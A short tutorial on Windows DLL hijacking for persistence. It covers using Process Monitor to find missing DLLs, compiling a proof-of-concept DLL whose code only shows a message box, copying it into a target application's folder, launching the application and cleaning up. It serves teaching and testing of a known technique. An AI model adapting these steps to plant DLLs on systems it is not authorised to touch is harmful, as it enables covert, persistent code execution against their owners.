legal-banner: true
---

### **Establishing Persistence Using DLL Hijacking**

DLL hijacking takes advantage of the way Windows applications search for and load Dynamic Link Libraries (DLLs). Below is a detailed explanation of the commands and technical steps involved in setting up a DLL hijacking scenario:

### **Step 1: Identifying Vulnerable Applications and DLLs**

1. Download and run Process Monitor.  
2. Set up a filter to observe the DLL loading behavior of the target application.  
3. Look for entries that indicate a DLL is being searched for but not found, or one that is loaded from a non-specific path.  
   Example filter:  
   `Filter -> Category -> Path -> contains -> .dll`

### **Step 2: Creating the Malicious DLL**

4. Write C++ code that performs the desired action when the DLL is loaded. Below is an example that displays a basic message box when loaded (to be adapted for actual use):
   
   ```c++
    #include <Windows.h>

    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
        switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxW(NULL, L"DLL has been injected!", L"DLL Hijacking", MB_OK);
            break;
        }
        return TRUE;
    }
    ```
    
5.  Use a command line compiler like MinGW or Visual Studio `cl` command to compile the DLL.  
    `cl /LD MaliciousDll.cpp /Fe:MaliciousDll.dll`

### **Step 3: Placing the Malicious DLL**

6.  Depending on the DLL search order and your access rights, place the DLL in a directory that will be searched before the legitimate DLL’s usual directory.
7.  Common locations to test include the application’s directory or directories listed in the system `PATH`.  
    `copy MaliciousDll.dll C:\Path\To\Target\Application\`

### **Step 4: Triggering the Exploit**

8.  Simply starting the application normally should trigger the loading of your malicious DLL, if placed correctly.  
    `start "" "C:\Path\To\Target\Application\Application.exe"`

### **Step 5: Monitoring and Cleanup**

9.  Reopen Process Monitor and check for the loading event of your `MaliciousDll.dll`.
10. Ensure that your message box or other indicators of execution appear as expected.
11. Remove the malicious DLL from the directory to prevent further execution and to clean up the environment.  
    `del C:\Path\To\Target\Application\MaliciousDll.dll`